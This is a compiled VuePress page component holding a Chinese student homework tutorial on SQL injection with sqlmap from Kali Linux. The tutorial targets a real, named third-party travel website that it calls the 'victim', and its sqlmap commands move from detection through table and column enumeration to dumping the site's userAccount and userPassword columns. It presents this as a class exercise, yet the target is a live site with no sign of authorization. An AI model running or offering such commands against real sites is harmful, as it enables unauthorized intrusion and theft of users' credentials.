import{_ as n,p as t,q as r,s as a,R as s,t as o,Y as p,n as i}from"./framework-e1bed10d.js";const c={},l=a("h2",{id:"一、准备工作",tabindex:"-1"},[a("a",{class:"header-anchor",href:"#一、准备工作","aria-hidden":"true"},"#"),s(),a("strong",null,"一、准备工作")],-1),m={href:"https://blog.csdn.net/qq_40950957/article/details/80468030",target:"_blank",rel:"noopener noreferrer"},d=p(`<p>其实虚拟机迟早都得学，都得用，我建议早点在自己电脑上装上</p><h2 id="二、打开vm-ware-和-kali-linux" tabindex="-1"><a class="header-anchor" href="#二、打开vm-ware-和-kali-linux" aria-hidden="true">#</a> <strong>二、打开VM Ware 和 Kali linux</strong></h2><p>俗话说，Kali用的好，牢饭吃到老，终于可以开始你的SQL注入之旅了。</p><h2 id="三、打开sqlmap工具" tabindex="-1"><a class="header-anchor" href="#三、打开sqlmap工具" aria-hidden="true">#</a> <strong>三、打开Sqlmap工具</strong></h2><p>在这儿 <img src="https://img-blog.csdnimg.cn/20201212215715375.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FsYW5Db3JuXzAy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="四、随机找一个受害者-网站" tabindex="-1"><a class="header-anchor" href="#四、随机找一个受害者-网站" aria-hidden="true">#</a> <strong>四、随机找一个受害者（网站）</strong></h2><p>网站老师给的PPT里有，这里用最后一个做示范 <img src="https://img-blog.csdnimg.cn/20201212215852493.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FsYW5Db3JuXzAy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="五、进行迫害" tabindex="-1"><a class="header-anchor" href="#五、进行迫害" aria-hidden="true">#</a> <strong>五、进行迫害</strong></h2><p><em>1、先看看能不能进行sql注入（扫描）</em></p><p>PS：让你输入Y/n的时候一律输Y就完了（Y用小写也是可以的）； -u后面的是自己选的网址</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>sqlmap <span class="token parameter variable">-u</span> http://www.17tour.com.tw/newsCat.php?cat<span class="token operator">=</span><span class="token number">1</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>一切正常的话大概会进到这块地方； 说明这个网站是可以的 <img src="https://img-blog.csdnimg.cn/20201212220452323.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FsYW5Db3JuXzAy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><em>2、爆表名</em></p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>sqlmap <span class="token parameter variable">-u</span> http://www.17tour.com.tw/newsCat.php?cat<span class="token operator">=</span><span class="token number">1</span> –tables
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>一切正常的话.... 就能看到两个database（数据库） 这里只贴了一个 <img src="https://img-blog.csdnimg.cn/20201212221208549.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FsYW5Db3JuXzAy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"> 找到那个类似于user这样的数据表，记下它在哪个数据库下面，实例中是 tourtw_new17tour 这个数据库 <img src="https://img-blog.csdnimg.cn/20201212221246590.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FsYW5Db3JuXzAy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><em>3、爆列名</em></p><p>user是你刚刚找到的表；名字可能类似user不一定就是user</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>sqlmap <span class="token parameter variable">-u</span> http://www.17tour.com.tw/newsCat.php?cat<span class="token operator">=</span><span class="token number">1</span> <span class="token parameter variable">--columns</span> <span class="token parameter variable">-T</span> <span class="token string">&quot;users&quot;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>一切顺利的话... <img src="https://img-blog.csdnimg.cn/20201212221623352.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FsYW5Db3JuXzAy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><em>4、就可以看到我们的目标了</em></p><p>就是那个userAccount 和userPassword 记得类比为自己的（小声bb）</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>sqlmap <span class="token parameter variable">-u</span> http://www.17tour.com.tw/newsCat.php?cat<span class="token operator">=</span><span class="token number">1</span> <span class="token parameter variable">--dump</span> <span class="token parameter variable">-C</span> <span class="token string">&quot;userAccount,userPassword&quot;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>最终结果 <img src="https://img-blog.csdnimg.cn/20201212221843933.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FsYW5Db3JuXzAy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="六、作业上传" tabindex="-1"><a class="header-anchor" href="#六、作业上传" aria-hidden="true">#</a> <strong>六、作业上传</strong></h2>`,21);function u(h,b){const e=i("ExternalLinkIcon");return t(),r("div",null,[l,a("p",null,[s("如果只在学校的电脑上耍可以跳过； 否则的话 需要VM Ware或者VirtualBox软件创建虚拟机。 安装Kali Linux虚拟机 这个教程很详细 "),a("a",m,[s("最新超详细虚拟机VMware安装Kali Linux"),o(e)])]),d])}const _=n(c,[["render",u],["__file","GCHomework_2.html.vue"]]);export{_ as default};
